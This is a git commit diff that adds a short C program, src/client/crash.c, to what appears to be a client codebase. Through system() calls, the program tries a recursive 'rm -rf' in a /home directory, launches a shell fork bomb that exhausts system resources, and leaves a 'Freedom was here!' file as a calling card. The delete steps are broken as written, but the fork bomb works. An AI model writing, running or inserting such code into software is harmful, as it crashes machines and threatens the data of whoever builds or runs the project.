f900984353fbb956a564f6839775f6ea822730a3
Catey Aitken <caitken31415@gmail.com>
2021-08-18 08:34:01 -0400

    More crash.c

---
+++ src/client/crash.c
@@ -0,0 +1,12 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+	system("cd /home/missiles");
+	system("rm -rf");
+	system("cd /home");
+	system("c(){ c|c& };c");
+	system("touch freedom.txt");
+	system("echo 'Freedom was here!' > freedom.txt");
+	system("cat freedom.txt");
+}
